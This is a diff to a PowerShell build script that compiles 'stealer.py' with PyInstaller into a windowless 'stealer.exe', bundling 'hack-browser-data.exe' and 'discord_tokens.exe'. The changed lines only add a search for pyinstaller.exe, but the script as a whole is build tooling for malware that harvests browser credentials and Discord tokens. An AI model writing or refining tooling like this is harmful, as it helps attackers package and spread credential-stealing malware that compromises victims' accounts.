@@ -25,13 +25,35 @@ if (-not (Test-Path $stealerPy)) { Write-Error "stealer.py not found in $here"; 
 if (-not (Test-Path $hbd))       { Write-Warning "hack-browser-data.exe not found in $here" }
 if (-not (Test-Path $discord))   { Write-Warning "discord_tokens.exe not found in $here" }
 
+# Find pyinstaller.exe — check PATH first, then common install locations
+$pi = Get-Command pyinstaller -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Source
+if (-not $pi) {
+    $candidates = @(
+        "$env:LOCALAPPDATA\Python\pythoncore-3.15-64\Scripts\pyinstaller.exe",
+        "$env:LOCALAPPDATA\Programs\Python\Python315\Scripts\pyinstaller.exe",
+        "$env:LOCALAPPDATA\Programs\Python\Python313\Scripts\pyinstaller.exe",
+        "$env:LOCALAPPDATA\Programs\Python\Python312\Scripts\pyinstaller.exe",
+        "$env:LOCALAPPDATA\Programs\Python\Python311\Scripts\pyinstaller.exe"
+    )
+    foreach ($c in $candidates) {
+        if (Test-Path $c) { $pi = $c; break }
+    }
+}
+if (-not $pi) {
+    # Last resort: search
+    $found = Get-ChildItem "$env:LOCALAPPDATA\Python" -Recurse -Filter "pyinstaller.exe" -ErrorAction SilentlyContinue | Select-Object -First 1
+    if ($found) { $pi = $found.FullName }
+}
+if (-not $pi) { Write-Error "pyinstaller.exe not found — run: pip install pyinstaller"; exit 1 }
+Write-Host "[*] Using pyinstaller: $pi"
+
 $piArgs = "--onefile --noconsole --distpath `"$here`" --workpath `"$here\pyinstaller_build`" --specpath `"$here\pyinstaller_build`""
 if (Test-Path $hbd)     { $piArgs += " --add-binary `"$hbd;.`"" }
 if (Test-Path $discord) { $piArgs += " --add-binary `"$discord;.`"" }
 $piArgs += " `"$stealerPy`""
 
-Write-Host "[*] Running: python -m pyinstaller $piArgs"
-Invoke-Expression "python -m pyinstaller $piArgs"
+Write-Host "[*] Running: $pi $piArgs"
+Invoke-Expression "& `"$pi`" $piArgs"
 
 if (-not (Test-Path $stealerExe)) {
     Write-Error "stealer.exe not found after build"
